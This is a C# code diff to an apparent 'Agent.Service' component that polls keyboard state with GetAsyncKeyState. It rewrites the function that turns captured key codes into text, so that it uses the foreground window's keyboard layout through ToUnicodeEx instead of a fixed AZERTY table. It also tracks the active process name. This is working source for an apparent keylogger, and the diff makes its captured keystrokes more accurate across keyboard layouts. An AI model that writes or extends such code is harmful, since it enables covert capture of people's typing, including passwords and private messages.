@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
+using System.Text;
 using System.Threading.Tasks;
 using EntryPoint;
 using Shared;
@@ -28,6 +29,21 @@ namespace Agent.Service
 
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
+
+        [DllImport("user32.dll")]
+        static extern bool GetKeyboardState(byte[] lpKeyState);
+
+        [DllImport("user32.dll")]
+        static extern IntPtr GetKeyboardLayout(uint idThread);
+
+        [DllImport("user32.dll")]
+        static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState,
+            [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);
+
+        [DllImport("user32.dll")]
+        static extern uint MapVirtualKeyEx(uint uCode, uint uMapType, IntPtr dwhkl);
+
+        const uint MAPVK_VK_TO_VSC = 0;
 
         string activeProcessName;
         string prevProcessName;
@@ -87,125 +103,74 @@ namespace Agent.Service
 
         private String verifyKey(int code)
         {
-            String key = "";
+            switch (code)
+            {
+                case 8: return "[Back]";
+                case 9: return "[TAB]";
+                case 13: return "[Enter]";
+                case 19: return "[Pause]";
+                case 20: return "[Caps Lock]";
+                case 27: return "[Esc]";
+                case 32: return " ";
+                case 33: return "[Page Up]";
+                case 34: return "[Page Down]";
+                case 35: return "[End]";
+                case 36: return "[Home]";
+                case 37: return "[Left]";
+                case 38: return "[Up]";
+                case 39: return "[Right]";
+                case 40: return "[Down]";
+                case 44: return "[Print Screen]";
+                case 45: return "[Insert]";
+                case 46: return "[Delete]";
+                case 91:
+                case 92: return "[Windows]";
+                case 93: return "[List]";
+                case 96: case 97: case 98: case 99: case 100:
+                case 101: case 102: case 103: case 104: case 105:
+                case 106: case 107: case 109: case 110: case 111:
+                    // numpad keys are translated below
+                    break;
+                case 112: return "[F1]";
+                case 113: return "[F2]";
+                case 114: return "[F3]";
+                case 115: return "[F4]";
+                case 116: return "[F5]";
+                case 117: return "[F6]";
+                case 118: return "[F7]";
+                case 119: return "[F8]";
+                case 120: return "[F9]";
+                case 121: return "[F10]";
+                case 122: return "[F11]";
+                case 123: return "[F12]";
+                case 144: return "[Num Lock]";
+                case 145: return "[Scroll Lock]";
+                case 160:
+                case 161: return "[Shift]";
+                case 162:
+                case 163: return "[Ctrl]";
+                case 164:
+                case 165: return "[Alt]";
+            }
 
-            if (code < 8) key = "";
-            else if (code == 8) key = "[Back]";
-            else if (code == 9) key = "[TAB]";
-            //else if (code == 10) key = "";
-            //else if (code == 11) key = "";
-            //else if (code == 12) key = "";
-            else if (code == 13) key = "[Enter]";
-            //else if (code == 14) key = "";
-            //else if (code == 15) key = "";
-            //else if (code == 16) key = "";
-            //else if (code == 17) key = "";
-            //else if (code == 18) key = "";
-            else if (code == 19) key = "[Pause]";
-            else if (code == 20) key = "[Caps Lock]";
-            else if (code == 27) key = "[Esc]";
-            else if (code == 32) key = " ";
-            else if (code == 33) key = "[Page Up]";
-            else if (code == 34) key = "[Page Down]";
-            else if (code == 35) key = "[End]";
-            else if (code == 36) key = "[Home]";
-            else if (code == 37) key = "[Left]";
-            else if (code == 38) key = "[Up]";
-            else if (code == 39) key = "[Right]";
-            else if (code == 40) key = "[Down]";
-            else if (code == 44) key = "[Print Screen]";
-            else if (code == 45) key = "[Insert]";
-            else if (code == 46) key = "[Delete]";
-            else if (code == 48) key = "à";
-            else if (code == 49) key = "&";
-            else if (code == 50) key = "é";
-            else if (code == 51) key = "\"";
-            else if (code == 52) key = "'";
-            else if (code == 53) key = "(";
-            else if (code == 54) key = "-";
-            else if (code == 55) key = "è";
-            else if (code == 56) key = "_";
-            else if (code == 57) key = "ç";
-            else if (code == 65) key = "a";
-            else if (code == 66) key = "b";
-            else if (code == 67) key = "c";
-            else if (code == 68) key = "d";
-            else if (code == 69) key = "e";
-            else if (code == 70) key = "f";
-            else if (code == 71) key = "g";
-            else if (code == 72) key = "h";
-            else if (code == 73) key = "i";
-            else if (code == 74) key = "j";
-            else if (code == 75) key = "k";
-            else if (code == 76) key = "l";
-            else if (code == 77) key = "m";
-            else if (code == 78) key = "n";
-            else if (code == 79) key = "o";
-            else if (code == 80) key = "p";
-            else if (code == 81) key = "q";
-            else if (code == 82) key = "r";
-            else if (code == 83) key = "s";
-            else if (code == 84) key = "t";
-            else if (code == 85) key = "u";
-            else if (code == 86) key = "v";
-            else if (code == 87) key = "w";
-            else if (code == 88) key = "x";
-            else if (code == 89) key = "y";
-            else if (code == 90) key = "z";
-            else if (code == 91) key = "[Windows]";
-            else if (code == 92) key = "[Windows]";
-            else if (code == 93) key = "[List]";
-            else if (code == 96) key = "0";
-            else if (code == 97) key = "1";
-            else if (code == 98) key = "2";
-            else if (code == 99) key = "3";
-            else if (code == 100) key = "4";
-            else if (code == 101) key = "5";
-            else if (code == 102) key = "6";
-            else if (code == 103) key = "7";
-            else if (code == 104) key = "8";
-            else if (code == 105) key = "9";
-            else if (code == 106) key = "*";
-            else if (code == 107) key = "+";
-            else if (code == 109) key = "-";
-            else if (code == 110) key = ",";
-            else if (code == 111) key = "/";
-            else if (code == 112) key = "[F1]";
-            else if (code == 113) key = "[F2]";
-            else if (code == 114) key = "[F3]";
-            else if (code == 115) key = "[F4]";
-            else if (code == 116) key = "[F5]";
-            else if (code == 117) key = "[F6]";
-            else if (code == 118) key = "[F7]";
-            else if (code == 119) key = "[F8]";
-            else if (code == 120) key = "[F9]";
-            else if (code == 121) key = "[F10]";
-            else if (code == 122) key = "[F11]";
-            else if (code == 123) key = "[F12]";
-            else if (code == 144) key = "[Num Lock]";
-            else if (code == 145) key = "[Scroll Lock]";
-            else if (code == 160) key = "[Shift]";
-            else if (code == 161) key = "[Shift]";
-            else if (code == 162) key = "[Ctrl]";
-            else if (code == 163) key = "[Ctrl]";
-            else if (code == 164) key = "[Alt]";
-            else if (code == 165) key = "[Alt]";
-            else if (code == 186) key = "$";
-            else if (code == 187) key = "+";
-            else if (code == 188) key = ",";
-            else if (code == 189) key = "-";
-            else if (code == 190) key = ";";
-            else if (code == 191) key = ":";
-            else if (code == 192) key = "ù";
-            else if (code == 192) key = ":";
-            else if (code == 219) key = ")";
-            else if (code == 220) key = "*";
-            else if (code == 221) key = "^";
-            else if (code == 222) key = "²";
-            else if (code == 223) key = "!";
-            else key = "{" + code + "}";
+            try
+            {
+                IntPtr hWnd = GetForegroundWindow();
+                uint threadId = GetWindowThreadProcessId(hWnd, out _);
+                IntPtr hkl = GetKeyboardLayout(threadId);
 
-            return key;
+                byte[] keyState = new byte[256];
+                GetKeyboardState(keyState);
+
+                uint scanCode = MapVirtualKeyEx((uint)code, MAPVK_VK_TO_VSC, hkl);
+                var chars = new StringBuilder(4);
+                int result = ToUnicodeEx((uint)code, scanCode, keyState, chars, chars.Capacity, 0, hkl);
+                if (result > 0)
+                    return chars.ToString(0, result);
+            }
+            catch { }
+
+            return "{" + code + "}";
         }
     }
 }
